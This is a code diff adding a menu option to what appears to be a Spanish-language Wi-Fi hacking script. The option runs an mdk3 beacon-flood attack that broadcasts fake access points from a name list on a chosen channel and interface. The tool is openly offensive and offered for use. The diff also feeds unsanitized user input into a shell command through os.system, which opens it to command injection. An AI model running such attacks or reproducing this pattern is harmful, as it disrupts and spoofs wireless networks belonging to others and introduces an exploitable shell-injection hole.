@@ -132,6 +132,19 @@ elif WH == 9:
     os.system("clear")
     os.system("python3 wifi-hack.py")    
 
+elif WH == 10:
+    os.system('clear')
+    banner()
+    print(" \033[1;37mIntroduzca la interfaz: (\033[0;37mwlan\033[0;31m0 \033[1;37m| \033[0;37mwlan\033[0;34m1\033[1;37m)")
+    interface = input(" \033[1;32m>> \033[0;37m")
+    print(" \033[1;37mIntroduzca el canal:")
+    channel = input(" \033[1;32m>> \033[0;37m")
+    print(" \033[1;37mIngrese el diccionario\033[0m (default: \033[1;37mfakeAP.txt\033[0m): ")
+    diccionario = str(input(" \033[1;32m>> \033[0;37m"))
+    print("\n \033[1;31m[AVISO] \033[0;37mPresione \033[1;37m\033[1;37mCTRL + C \033[0;37mpara detener el ataque\033[0m")
+    os.system("mdk3 {} b -f {} -a -s 1000 -c {}".format(interface,diccionario,channel))
+    time.sleep(2)   
+
 elif WH == 0:
     os.system("clear")
     goodbye()
